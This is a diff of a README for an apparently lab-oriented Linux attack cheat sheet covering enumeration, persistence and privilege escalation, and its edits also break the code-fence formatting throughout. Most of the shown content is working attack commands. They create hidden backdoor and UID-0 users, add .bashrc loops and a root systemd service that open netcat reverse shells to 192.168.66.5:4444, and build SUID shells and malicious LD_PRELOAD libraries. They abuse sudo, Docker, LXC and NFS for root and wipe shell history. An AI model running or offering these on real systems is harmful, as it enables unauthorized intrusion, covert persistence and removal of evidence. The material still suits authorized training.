@@ -1,13 +1,18 @@
 <div align="center">
-<img width="1700" height="240" alt="image" src="https://github.com/user-attachments/assets/dd4202a6-d262-4755-bd50-560463a0e39b" />
 
-![Linux](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
-![Bash](https://img.shields.io/badge/Shell-Bash-4EAA25?style=flat-square&logo=gnu-bash&logoColor=white)
-![CTF](https://img.shields.io/badge/Purpose-CTF%20%2F%20Lab-blueviolet?style=flat-square)
-![Count](https://img.shields.io/badge/Techniques-29-critical?style=flat-square)
-![Author](https://img.shields.io/badge/Author-m.manikandan-orange?style=flat-square)
+<img src="https://capsule-render.vercel.app/api?type=waving&color=0:8B0000,50:FF4500,100:FFD700&height=200&section=header&text=Linux%20PrivEsc%20Lab&fontSize=55&fontColor=ffffff&animation=fadeIn&fontAlignY=38&desc=Enumeration%20%C2%B7%20Persistence%20%C2%B7%20Privilege%20Escalation&descAlignY=58&descSize=20" width="100%"/>
 
-> ⚠️ **For authorized lab / CTF environments only. Never test on systems you do not own.**
+<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&pause=1000&color=F75C7E&center=true&vCenter=true&width=600&lines=29+Hands-On+Linux+Techniques+🛠️;Run+in+Your+Own+Lab+Only+⚠️;Enumerate+→+Persist+→+Escalate+🚀" alt="Typing SVG" /></a>
+
+<br>
+
+![Linux](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
+![Bash](https://img.shields.io/badge/Shell-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white)
+![CTF](https://img.shields.io/badge/Purpose-CTF%20%2F%20Lab-blueviolet?style=for-the-badge)
+![Count](https://img.shields.io/badge/Techniques-29-critical?style=for-the-badge)
+![Author](https://img.shields.io/badge/Author-m.manikandan-orange?style=for-the-badge)
+
+> ⚠️ **WARNING — Authorized lab / CTF environments only.** Never test on systems you do not own. Always run the 🧹 **Cleanup** steps after each lab.
 
 </div>
 
@@ -15,27 +20,73 @@
 
 ## 📋 Table of Contents
 
-| 🔵 🔍 Enumeration | 🟠 🔒 Persistence | 🔴 ⚡ Privilege Escalation |
-|---|---|---|
-| [01 · System Information](#01--system-information) | [09 · Backdoor User](#09--backdoor-user) | [13 · SUID Abuse](#13--suid-binary-abuse) |
-| [02 · Users & Groups](#02--user--group-enumeration) | [10 · .bashrc Persistence](#10--bashrc--bash_profile-persistence) | [14 · Capabilities](#14--linux-capabilities) |
-| [03 · Network](#03--network-enumeration) | [11 · SSH Public Key](#11--ssh-public-key-persistence) | [15 · Sudo / GTFOBins](#15--vulnerable-sudo--gtfobins) |
-| [04 · Processes & Services](#04--process--services) | [12 · Systemd + Netcat](#12--systemd-service--netcat) | [16 · LD_PRELOAD](#16--sudo-setenv--ld_preload) |
-| [05 · Scheduled Tasks](#05--scheduled-tasks) | | [17 · Shared Object Injection](#17--shared-object-injection) |
-| [06 · File System](#06--file-system--interesting-files) | | [18 · Cron Job](#18--cron-job-abuse) |
-| [07 · Credentials](#07--credentials--sensitive-files) | | [19 · Writable PATH](#19--writable-path-hijack) |
-| [08 · Software & Kernel](#08--installed-software--kernel-exploits) | | [20 · Systemd Service Abuse](#20--systemd-service-abuse) |
-| | | [21 · Docker Group](#21--docker-group-escalation) |
-| | | [22 · Incus / LXC](#22--incus--lxc-container) |
-| | | [23 · NFS no_root_squash](#23--nfs-no_root_squash) |
-| | | [24 · Polkit rules.d](#24--polkit-rulesd) |
-| | | [25 · Writable /etc/passwd](#25--writable-etcpasswd) |
-| | | [26 · Root SSH Key](#26--readable-root-ssh-key) |
-| | | [27 · nc Reverse Shell](#27--reverse-shell-via-nc) |
-| | | [28 · Kernel Exploits](#28--kernel-exploits) |
-| | | [29 · Internals Reference](#29--internals-reference) |
+<details open>
+<summary><b>🔵 🔍 &nbsp;ENUMERATION — 8 techniques</b></summary>
+<br>
 
+| # | Technique |
+|---|-----------|
+| 01 | [🖥️ System Information](#01--system-information) |
+| 02 | [👥 Users & Groups](#02--user--group-enumeration) |
+| 03 | [🌐 Network](#03--network-enumeration) |
+| 04 | [⚙️ Processes & Services](#04--process--services) |
+| 05 | [⏰ Scheduled Tasks](#05--scheduled-tasks) |
+| 06 | [📁 File System & Interesting Files](#06--file-system--interesting-files) |
+| 07 | [🔑 Credentials & Sensitive Files](#07--credentials--sensitive-files) |
+| 08 | [📦 Installed Software & Kernel](#08--installed-software--kernel-exploits) |
+
+</details>
+
+<details open>
+<summary><b>🟠 🔒 &nbsp;PERSISTENCE — 4 techniques</b></summary>
+<br>
+
+| # | Technique |
+|---|-----------|
+| 01 | [👤 Backdoor User](#01--backdoor-user) |
+| 02 | [📜 .bashrc / .bash_profile](#02--bashrc--bash_profile-persistence) |
+| 03 | [🔐 SSH Public Key](#03--ssh-public-key-persistence) |
+| 04 | [🛰️ Systemd Service + Netcat](#04--systemd-service--netcat) |
+
+</details>
+
+<details open>
+<summary><b>🔴 ⚡ &nbsp;PRIVILEGE ESCALATION — 17 techniques</b></summary>
+<br>
+
+| # | Technique |
+|---|-----------|
+| 01 | [🟥 SUID Binary Abuse](#01--suid-binary-abuse) |
+| 02 | [🧬 Linux Capabilities](#02--linux-capabilities) |
+| 03 | [🔓 Vulnerable Sudo / GTFOBins](#03--vulnerable-sudo--gtfobins) |
+| 04 | [💉 Sudo SETENV + LD_PRELOAD](#04--sudo-setenv--ld_preload) |
+| 05 | [🧩 Shared Object Injection](#05--shared-object-injection) |
+| 06 | [⏱️ Cron Job Abuse](#06--cron-job-abuse) |
+| 07 | [🛤️ Writable PATH Hijack](#07--writable-path-hijack) |
+| 08 | [🔧 Systemd Service Abuse](#08--systemd-service-abuse) |
+| 09 | [🐳 Docker Group Escalation](#09--docker-group-escalation) |
+| 10 | [📦 Incus / LXC Container](#10--incus--lxc-container) |
+| 11 | [🗄️ NFS no_root_squash](#11--nfs-no_root_squash) |
+| 12 | [🛡️ Polkit rules.d](#12--polkit-rulesd) |
+| 13 | [📝 Writable /etc/passwd](#13--writable-etcpasswd) |
+| 14 | [🔏 Readable Root SSH Key](#14--readable-root-ssh-key) |
+| 15 | [🐚 Reverse Shell via nc](#15--reverse-shell-via-nc) |
+| 16 | [🧨 Kernel Exploits](#16--kernel-exploits) |
+| 17 | [📚 Internals Reference](#17--internals-reference) |
+
+</details>
 ---
+
+
+## 🗺️ How to Use This Guide
+
+> 💡 **Workflow:** run the 🔵 enumeration checks first → pick a 🟠 persistence method if you need to keep access → then attempt the 🔴 escalation path. Each technique ends with 🧹 **Cleanup** — always run it when the lab is over.
+
+| Phase | Color | Range | Goal |
+|-------|-------|-------|------|
+| 🔍 Enumeration | 🔵 blue | 01–08 | Map the system, find weaknesses |
+| 🔒 Persistence | 🟠 orange | 01–04 | Keep access across reboots |
+| ⚡ Privilege Escalation | 🔴 red | 01–17 | Become root |
 
 ---
 
@@ -44,10 +95,10 @@
 
 ---
 
-### 01 · System Information
+### 🖥️ 01 · System Information
 
 <details>
-<summary>Click to expand</summary>
+<summary>📂 Click to expand</summary>
 <br>
 
 ```bash
@@ -59,16 +110,15 @@ hostnamectl               # Hostname, kernel, architecture
 cat /etc/*-release        # Catch-all for release files
 cat /proc/cpuinfo         # CPU details
 cat /proc/meminfo         # Memory details
-```
-
+```bash
 </details>
 
 ---
 
-### 02 · User & Group Enumeration
+### 👥 02 · User & Group Enumeration
 
 <details>
-<summary>Click to expand</summary>
+<summary>📂 Click to expand</summary>
 <br>
 
 ```bash
@@ -83,16 +133,15 @@ cat /etc/sudoers                        # Sudo config (if readable)
 find / -user <username> 2>/dev/null     # Files owned by user
 lastlog                                 # Last login of all users
 w                                       # Who is logged on right now
-```
-
+```bash
 </details>
 
 ---
 
-### 03 · Network Enumeration
+### 🌐 03 · Network Enumeration
 
 <details>
-<summary>Click to expand</summary>
+<summary>📂 Click to expand</summary>
 <br>
 
 ```bash
@@ -104,16 +153,15 @@ netstat -antp / ss -antp                # All TCP connections with PIDs
 cat /etc/hosts                          # Static host mappings
 cat /etc/resolv.conf                    # DNS servers
 iptables -L -n / nft list ruleset       # Firewall rules
-```
-
+```bash
 </details>
 
 ---
 
-### 04 · Process & Services
+### ⚙️ 04 · Process & Services
 
 <details>
-<summary>Click to expand</summary>
+<summary>📂 Click to expand</summary>
 <br>
 
 ```bash
@@ -126,16 +174,15 @@ pspy                                                          # Unprivileged mon
 cat /proc/1/comm                                              # PID 1 init system
 ls -la /proc/*/exe 2>/dev/null | grep -v "Permission denied"  # Find binaries
 cat /etc/inetd.conf /etc/xinetd.conf                          # Legacy service configs
-```
-
+```bash
 </details>
 
 ---
 
-### 05 · Scheduled Tasks
+### ⏰ 05 · Scheduled Tasks
 
 <details>
-<summary>Click to expand</summary>
+<summary>📂 Click to expand</summary>
 <br>
 
 ```bash
@@ -144,16 +191,15 @@ cat /etc/crontab               # System-wide crontab
 ls -la /etc/cron.*             # daily / hourly / weekly jobs
 systemctl list-timers --all    # Systemd timers
 cat /etc/anacrontab            # Anacron jobs
-```
-
+```bash
 </details>
 
 ---
 
-### 06 · File System & Interesting Files
+### 📁 06 · File System & Interesting Files
 
 <details>
-<summary>Click to expand</summary>
+<summary>📂 Click to expand</summary>
 <br>
 
 ```bash
@@ -168,16 +214,15 @@ ls -la /var/backups /opt /tmp /var/tmp                                  # Backup
 cat /etc/fstab                                                          # Mounted filesystems
 mount                                                                   # Currently mounted
 df -h                                                                   # Disk usage
-```
-
+```bash
 </details>
 
 ---
 
-### 07 · Credentials & Sensitive Files
+### 🔑 07 · Credentials & Sensitive Files
 
 <details>
-<summary>Click to expand</summary>
+<summary>📂 Click to expand</summary>
 <br>
 
 ```bash
@@ -189,16 +234,15 @@ cat ~/.bash_history
 cat ~/.mysql_history
 env                                                                      # Environment variables
 cat /proc/1/environ | tr '\0' '\n'                                    # Env of PID 1
-```
-
+```bash
 </details>
 
 ---
 
-### 08 · Installed Software & Kernel Exploits
+### 📦 08 · Installed Software & Kernel Exploits
 
 <details>
-<summary>Click to expand</summary>
+<summary>📂 Click to expand</summary>
 <br>
 
 ```bash
@@ -209,8 +253,7 @@ ls -la /usr/local/bin /usr/bin /bin   # Custom binaries
 ls -la /usr/sbin /sbin                # Admin tools
 apk list --installed                  # Alpine Linux
 uname -a                              # Kernel → check Exploit-DB
-```
-
+```bash
 **Useful Tools:**
 ```bash
 # Clone and run
@@ -220,8 +263,7 @@ git clone https://github.com/Aegrah/PANIX.git
 
 pip install gtfobins-cli --break-system-packages
 gtfo python
-```
-
+```bash
 </details>
 
 
@@ -234,35 +276,31 @@ gtfo python
 
 ---
 
-### 09 · Backdoor User
+### 👤 01 · Backdoor User
 
 <details>
-<summary>5 methods to create hidden / root users</summary>
+<summary>🎭 5 methods to create hidden / root users</summary>
 <br>
 
 **METHOD 1 — backdoor user**
 ```bash
 groupdel backdoor 2>/dev/null; useradd -m -s /bin/bash -U backdoor && echo 'backdoor:backdoor' | chpasswd
-```
-
+```bash
 **METHOD 2 — ghost (UID 0 root clone)**
 ```bash
 groupadd ghost 2>/dev/null; useradd -o -u 0 -g 0 -s /bin/bash -M -d /root ghost && echo 'ghost:ghost' | chpasswd
-```
-
+```bash
 **METHOD 3 — hacker (manual passwd/shadow)**
 ```bash
 HASH=$(openssl passwd -6 'hacker') && \
   echo "hacker:x:1337:1337::/home/hacker:/bin/bash" >> /etc/passwd && \
   echo "hacker:${HASH}:19000:0:99999:7:::" >> /etc/shadow && \
   groupadd -g 1337 hacker && mkdir -p /home/hacker && chown 1337:1337 /home/hacker
-```
-
+```bash
 **METHOD 4 — support (sudo group)**
 ```bash
 useradd -m -s /bin/bash -U support && echo 'support:support' | chpasswd && usermod -aG sudo support
-```
-
+```bash
 **METHOD 5 — pyuser (Python)**
 ```bash
 python3 -c "
@@ -271,13 +309,11 @@ h = subprocess.check_output(['openssl','passwd','-6','pyuser']).decode().strip()
 open('/etc/passwd','a').write('pyuser:x:1339:1339::/home/pyuser:/bin/bash\n')
 open('/etc/shadow','a').write(f'pyuser:{h}:19000:0:99999:7:::')
 " && groupadd -g 1339 pyuser && mkdir -p /home/pyuser && chown 1339:1339 /home/pyuser
-```
-
-**Verify all 5:**
+```bash
+> ✅ **Verify all 5:**
 ```bash
 for u in backdoor ghost hacker support pyuser; do echo -n "$u → " && su $u -c "id" 2>&1; done
-```
-
+```bash
 **Hide the user (extra stealth):**
 ```bash
 # GDM3
@@ -287,9 +323,8 @@ nano /etc/gdm3/custom.conf
 # LightDM
 nano /etc/lightdm/users.conf
 # Add: hidden-users=backdoor
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 for u in backdoor ghost hacker support pyuser; do
   userdel -r $u 2>/dev/null
@@ -300,23 +335,21 @@ done
 
 # Confirm clean
 grep -E 'backdoor|ghost|hacker|support|pyuser' /etc/passwd && ls /home/
-```
-
+```bash
 </details>
 
 ---
 
-### 10 · .bashrc / .bash_profile Persistence
+### 📜 02 · .bashrc / .bash_profile Persistence
 
 <details>
-<summary>Reverse shell that fires every time bash starts</summary>
+<summary>🔁 Reverse shell that fires every time bash starts</summary>
 <br>
 
 **Step 1 — Attacker listener:**
 ```bash
 nc -lvnp 4444
-```
-
+```bash
 **Step 2 — Purge old .bashrc entries:**
 ```bash
 sed -i '/nc 192.168.66.5 4444/d' ~/.bashrc
@@ -325,15 +358,13 @@ sed -i '/mkfifo \/tmp\/.f/d' ~/.bashrc
 sed -i '/mkfifo \/tmp\/f/d' ~/.bashrc
 sed -i '/nc 192.168.66.5 4444/d; /mkfifo \/tmp\/.p/d; /mkfifo \/tmp\/f/d; /bash-loop/d; /nc-loop/d; /\/dev\/tcp\/192\.168\.66\.5\/4444/d; /nohup sh -c/d' ~/.bashrc
 grep -n -E 'nc|mkfifo|/dev/tcp|bash-loop|nc-loop' ~/.bashrc
-```
-
+```bash
 **Step 3 — Kill lingering jobs:**
 ```bash
 pkill -f 'nc 192.168.66.5 4444'
 pkill -f 'mkfifo /tmp/f'
 pkill -f 'mkfifo /tmp/.f'
-```
-
+```bash
 **Step 4 — Add bulletproof persistent loop:**
 ```bash
 cat >> ~/.bashrc << 'EOF'
@@ -352,8 +383,7 @@ if ! pgrep -f "nc-loop-4444" > /dev/null; then
     disown %-
 fi
 EOF
-```
-
+```bash
 **OR — with PTY shell:**
 ```bash
 pkill -f 'nc 192.168.66.5 4444'
@@ -363,71 +393,62 @@ while true; do
     cat /tmp/.p | python3 -c 'import pty; pty.spawn("/bin/bash")' 2>&1 | nc 192.168.66.5 4444 > /tmp/.p
     sleep 5
 done
-```
-
+```bash
 **Trigger:**
 ```bash
 exec bash
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sed -i '/nc 10.0.2.30 4444/d' ~/.bashrc
 history -c && rm ~/.bash_history
-```
-
+```bash
 </details>
 
 ---
 
-### 11 · SSH Public Key Persistence
+### 🔐 03 · SSH Public Key Persistence
 
 <details>
-<summary>Passwordless SSH login that survives reboots</summary>
+<summary>🔑 Passwordless SSH login that survives reboots</summary>
 <br>
 
 **Step 1 — Generate fresh key pair:**
 ```bash
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist -N ""
-```
-
+```bash
 **Step 2 — Install public key:**
 ```bash
 cat ~/.ssh/persist.pub > ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
-```
-
+```bash
 **Step 3 — Test passwordless login:**
 ```bash
 ssh -i ~/.ssh/persist kali@192.168.66.5
-```
-
+```bash
 **Backup the key:**
 ```bash
 cp ~/.ssh/persist ~/backup_persist.key
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sed -i '/persist/d' ~/.ssh/authorized_keys 2>/dev/null
 rm -f ~/.ssh/persist ~/.ssh/persist.pub ~/.ssh/config
-```
-
+```bash
 </details>
 
 ---
 
-### 12 · Systemd Service + Netcat
+### 🛰️ 04 · Systemd Service + Netcat
 
 <details>
-<summary>Reverse shell service that auto-restarts on boot</summary>
+<summary>🛰️ Reverse shell service that auto-restarts on boot</summary>
 <br>
 
 **Step 1 — Attacker listener:**
 ```bash
 nc -lvnp 4444
-```
-
+```bash
 **Step 2 — Create service (nc with -e flag):**
 ```bash
 cat > /etc/systemd/system/sysnetwork.service << 'EOF'
@@ -445,8 +466,7 @@ User=root
 [Install]
 WantedBy=multi-user.target
 EOF
-```
-
+```bash
 **Step 3 — If nc has no -e flag (OpenBSD nc):**
 ```bash
 cat > /etc/systemd/system/sysnetwork.service << 'EOF'
@@ -464,13 +484,11 @@ User=root
 [Install]
 WantedBy=multi-user.target
 EOF
-```
-
+```bash
 **Step 4 — Enable and start:**
 ```bash
 systemctl daemon-reload && systemctl enable sysnetwork.service && systemctl start sysnetwork.service
-```
-
+```bash
 **Verify:**
 ```bash
 systemctl status sysnetwork.service
@@ -478,9 +496,8 @@ systemctl is-enabled sysnetwork.service
 systemctl restart sysnetwork.service
 systemctl list-units --type=service --state=enabled | grep -v snap
 ls -la /etc/systemd/system/
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 systemctl stop sysnetwork.service && \
 systemctl disable sysnetwork.service && \
@@ -491,8 +508,7 @@ rm -f /tmp/.p
 # Verify clean
 systemctl status sysnetwork.service 2>&1
 ls /etc/systemd/system/ | grep -v snap
-```
-
+```bash
 </details>
 
 
@@ -505,10 +521,10 @@ ls /etc/systemd/system/ | grep -v snap
 
 ---
 
-### 13 · SUID Binary Abuse
+### 🟥 01 · SUID Binary Abuse
 
 <details>
-<summary>Find and abuse SUID binaries to get root shell</summary>
+<summary>🟥 Find and abuse SUID binaries to get root shell</summary>
 <br>
 
 **Find all SUID binaries:**
@@ -516,8 +532,7 @@ ls /etc/systemd/system/ | grep -v snap
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
 find / -perm -4000 -type f 2>/dev/null > suid_bins.txt
-```
-
+```bash
 **Exploit — Create SUID root shell:**
 ```bash
 cp /bin/bash /home/kali/bash_suid
@@ -525,8 +540,7 @@ sudo chown root:root /home/kali/bash_suid
 sudo chmod u+s /home/kali/bash_suid
 /home/kali/bash_suid -p
 # id → euid=0(root)
-```
-
+```bash
 **Option 2 — .deb postinst trick:**
 ```bash
 mkdir -p /tmp/rootme/DEBIAN
@@ -546,13 +560,11 @@ EOF
 chmod 755 /tmp/rootme/DEBIAN/postinst
 dpkg-deb -b /tmp/rootme /tmp/rootme.deb
 sudo dpkg -i /tmp/rootme.deb
-```
-
+```bash
 **Option 2 — Single payload:**
 ```bash
 mkdir -p /tmp/rootme/DEBIAN && echo -e 'Package: rootme\nVersion: 1\nArchitecture: all\nMaintainer: a\nDescription: a\n' > /tmp/rootme/DEBIAN/control && echo '#!/bin/bash' > /tmp/rootme/DEBIAN/postinst && echo '/bin/bash -i' >> /tmp/rootme/DEBIAN/postinst && chmod 755 /tmp/rootme/DEBIAN/postinst && dpkg-deb -b /tmp/rootme /tmp/rootme.deb >/dev/null 2>&1 && sudo dpkg -i /tmp/rootme.deb
-```
-
+```bash
 **Option 3:**
 ```bash
 ls -ld /home/kali
@@ -561,23 +573,21 @@ cp /bin/bash /home/kali/shell_suid
 sudo chown root:root /home/kali/shell_suid
 sudo chmod u+s /home/kali/shell_suid
 /home/kali/shell_suid -p
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sudo rm /home/kali/bash_suid /home/kali/shell_suid /home/kali/test_suid
 sudo rm /tmp/vuln /tmp/bash_suid /tmp/libcustom.* /tmp/PwnKit 2>/dev/null
 sudo rm /root/testfile 2>/dev/null
-```
-
+```bash
 </details>
 
 ---
 
-### 14 · Linux Capabilities
+### 🧬 02 · Linux Capabilities
 
 <details>
-<summary>Abuse fine-grained capabilities set on binaries</summary>
+<summary>🧬 Abuse fine-grained capabilities set on binaries</summary>
 <br>
 
 **cap_setuid → root shell:**
@@ -588,96 +598,83 @@ getcap /home/kali/pycap
 # Output: /home/kali/pycap cap_setuid=ep
 
 /home/kali/pycap -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
-```
-
+```bash
 **cap_dac_read_search → read any file:**
 ```bash
 cp /bin/cat /home/kali/readcat
 sudo setcap cap_dac_read_search=ep /home/kali/readcat
 /home/kali/readcat /etc/shadow
-```
-
+```bash
 **cap_sys_ptrace → injection demo:**
 ```bash
 sudo sleep 1000 &
 cp /bin/bash /home/kali/ptbash
 sudo setcap cap_sys_ptrace=ep /home/kali/ptbash
 /home/kali/ptbash -c 'kill -STOP <PID_of_sleep>; echo "Attach would succeed here"'
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 rm /home/kali/pycap /home/kali/readcat /home/kali/ptbash
 sudo sed -i '/^evil:/d' /etc/passwd
-```
-
+```bash
 </details>
 
 ---
 
-### 15 · Vulnerable Sudo / GTFOBins
+### 🔓 03 · Vulnerable Sudo / GTFOBins
 
 <details>
-<summary>Exploit sudo misconfigs using GTFOBins binaries</summary>
+<summary>🔓 Exploit sudo misconfigs using GTFOBins binaries</summary>
 <br>
 
-**Always check first:**
+> 🎯 **Always check first:**
 ```bash
 sudo -l
 sudo -i
-```
-
+```bash
 **find:**
 ```bash
 sudo find . -exec /bin/sh \; -quit
 sudo find . -exec /bin/bash -p \; -quit
-```
-
+```bash
 **vim / vi:**
 ```bash
 sudo vim -c ':!/bin/sh'
-```
-
+```bash
 **perl:**
 ```bash
 sudo perl -e 'exec "/bin/sh";'
-```
-
+```bash
 **python:**
 ```bash
 sudo python -c 'import os; os.system("/bin/sh")'
-```
-
+```bash
 **awk:**
 ```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
-```
-
+```bash
 **git:**
 ```bash
 sudo git -p help
 # Then type: !/bin/sh
-```
-
+```bash
 **node:**
 ```bash
 sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
-```
-
+```bash
 **Add root user with empty password:**
 ```bash
 echo "root2::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
 su root2
-```
-
+```bash
 </details>
 
 ---
 
-### 16 · Sudo SETENV + LD_PRELOAD
+### 💉 04 · Sudo SETENV + LD_PRELOAD
 
 <details>
-<summary>Inject malicious shared library via sudo SETENV misconfiguration</summary>
+<summary>💉 Inject malicious shared library via sudo SETENV</summary>
 <br>
 
 **Setup — Create vulnerable test user:**
@@ -686,13 +683,11 @@ sudo useradd -m -s /bin/bash testuser
 sudo passwd testuser          # e.g. lab123
 sudo visudo -f /etc/sudoers.d/testuser
 # Add this line: testuser ALL=(ALL:ALL) SETENV: ALL
-```
-
+```bash
 **Switch to test user:**
 ```bash
 su - testuser
-```
-
+```bash
 **Create malicious shared library:**
 ```bash
 cat > /tmp/preload.c << 'EOF'
@@ -710,28 +705,25 @@ void _init(void) {
 EOF
 
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
-```
-
+```bash
 **Exploit:**
 ```bash
 sudo LD_PRELOAD=/tmp/preload.so /bin/true
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sudo rm /etc/sudoers.d/testuser
 sudo userdel -r testuser
 rm /tmp/preload.c /tmp/preload.so
-```
-
+```bash
 </details>
 
 ---
 
-### 17 · Shared Object Injection
+### 🧩 05 · Shared Object Injection
 
 <details>
-<summary>Plant malicious .so in SUID binary's RPATH directory</summary>
+<summary>🧩 Plant malicious .so in SUID binary RPATH</summary>
 <br>
 
 **Build the lab:**
@@ -754,8 +746,7 @@ sudo chown root:root vuln
 sudo chmod u+s vuln
 ldd ./vuln | grep custom
 # libcustom.so => /tmp/libcustom.so
-```
-
+```bash
 **Exploit:**
 ```bash
 cat > /tmp/evil.c << 'EOF'
@@ -773,21 +764,19 @@ EOF
 
 gcc -shared -fPIC -nostartfiles -o /tmp/libcustom.so /tmp/evil.c
 /home/kali/solab/vuln
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 rm -rf /home/kali/solab /tmp/libcustom.so /tmp/evil.c /tmp/libcustom.c 2>/dev/null
-```
-
+```bash
 </details>
 
 ---
 
-### 18 · Cron Job Abuse
+### ⏱️ 06 · Cron Job Abuse
 
 <details>
-<summary>Replace a writable root cron script with a reverse shell</summary>
+<summary>⏱️ Replace a writable root cron script</summary>
 <br>
 
 **Setup:**
@@ -802,27 +791,24 @@ EOF
 sudo chmod +x /opt/revlab/backup.sh
 
 echo "* * * * * root /opt/revlab/backup.sh" | sudo tee -a /etc/crontab
-```
-
-**Listener:**
+```bash
+> 👂 **Attacker listener:**
 ```bash
 nc -lvnp 4444
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sudo sed -i '/\/opt\/revlab\/backup.sh/d' /etc/crontab
 sudo rm -rf /opt/revlab
-```
-
+```bash
 </details>
 
 ---
 
-### 19 · Writable PATH Hijack
+### 🛤️ 07 · Writable PATH Hijack
 
 <details>
-<summary>Plant a malicious binary earlier in root's PATH</summary>
+<summary>🛤️ Plant a malicious binary in root's PATH</summary>
 <br>
 
 ```bash
@@ -857,24 +843,22 @@ tail -3 /etc/passwd
 
 # 8. Become root
 su evil
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sudo sed -i '/^evil:/d' /etc/passwd
 sudo crontab -r
 sudo chmod 755 /usr/local/bin
 sudo rm /usr/local/bin/cleanup
-```
-
+```bash
 </details>
 
 ---
 
-### 20 · Systemd Service Abuse
+### 🔧 08 · Systemd Service Abuse
 
 <details>
-<summary>Overwrite a world-writable root systemd service script</summary>
+<summary>🔧 Overwrite a writable root systemd service</summary>
 <br>
 
 **Setup:**
@@ -905,14 +889,12 @@ EOF
 sudo systemctl daemon-reload
 sudo systemctl start cleanup.service
 sudo systemctl enable cleanup.service
-```
-
+```bash
 **Verify service running:**
 ```bash
 sudo systemctl status cleanup
 sudo cat /var/log/cleanup.log
-```
-
+```bash
 **Exploit (as normal kali user):**
 ```bash
 nc -lvnp 4444
@@ -924,26 +906,24 @@ EOF
 
 sudo systemctl restart cleanup
 # Service auto-restarts every 60s due to Restart=always
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sudo systemctl stop cleanup
 sudo systemctl disable cleanup
 sudo rm /etc/systemd/system/cleanup.service
 sudo systemctl daemon-reload
 sudo rm -rf /opt/service-lab
-```
-
+```bash
 </details>
 
 
 ---
 
-### 21 · Docker Group Escalation
+### 🐳 09 · Docker Group Escalation
 
 <details>
-<summary>docker group membership = root — mount host fs and modify shadow</summary>
+<summary>🐳 docker group = root — mount host fs</summary>
 <br>
 
 ```bash
@@ -973,23 +953,21 @@ exit
 
 # Become root (no password asked)
 su -
-```
-
+```bash
 🧹 **Restore:**
 ```bash
 sed -i 's/^root::/root:*:/' /etc/shadow
 passwd -l root
 sudo groupdel docker
-```
-
+```bash
 </details>
 
 ---
 
-### 22 · Incus / LXC Container
+### 📦 10 · Incus / LXC Container
 
 <details>
-<summary>Privileged container with host filesystem mounted</summary>
+<summary>📦 Privileged container w/ host fs mounted</summary>
 <br>
 
 **Install and setup:**
@@ -999,8 +977,7 @@ sudo usermod -aG incus $USER
 newgrp incus
 sudo systemctl start incus && sudo systemctl enable incus
 incus admin init --auto
-```
-
+```bash
 **Exploit:**
 ```bash
 # Create privileged container with host mount
@@ -1017,23 +994,21 @@ exit
 # --- BACK ON HOST ---
 
 su -
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 incus stop privesc && incus delete privesc
 passwd -l root
 sudo gpasswd -d $USER incus
-```
-
+```bash
 </details>
 
 ---
 
-### 23 · NFS no_root_squash
+### 🗄️ 11 · NFS no_root_squash
 
 <details>
-<summary>Create SUID shell on NFS share via root docker client</summary>
+<summary>🗄️ SUID shell via NFS no_root_squash</summary>
 <br>
 
 **Preparation:**
@@ -1041,8 +1016,7 @@ sudo gpasswd -d $USER incus
 sudo groupadd docker 2>/dev/null
 sudo systemctl restart docker.socket && sudo systemctl start docker
 docker ps
-```
-
+```bash
 **Setup NFS server on Kali:**
 ```bash
 sudo apt update && sudo apt install nfs-kernel-server -y
@@ -1054,8 +1028,7 @@ sudo exportfs -ra && sudo systemctl restart nfs-server
 showmount -e localhost
 # Export list for localhost:
 # /nfs_share *
-```
-
+```bash
 **Simulate NFS client using Docker:**
 ```bash
 docker run -it --rm --privileged --name nfs-client ubuntu bash
@@ -1069,15 +1042,13 @@ cp /bin/bash /mnt/nfs/rootshell
 chmod u+s /mnt/nfs/rootshell
 ls -l /mnt/nfs/rootshell    # -rwsr-xr-x 1 root root
 exit
-```
-
+```bash
 **Escalate on host:**
 ```bash
 /nfs_share/rootshell -p
 id    # euid=0(root)
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sudo rm -f /nfs_share/rootshell /nfs_share/testfile
 sudo sed -i '/\/nfs_share/d' /etc/exports
@@ -1086,23 +1057,21 @@ sudo systemctl stop nfs-server && sudo systemctl disable nfs-server
 sudo rm -rf /nfs_share
 sudo apt remove --purge nfs-kernel-server nfs-common -y
 docker rm -f nfs-client 2>/dev/null
-```
-
+```bash
 </details>
 
 ---
 
-### 24 · Polkit rules.d
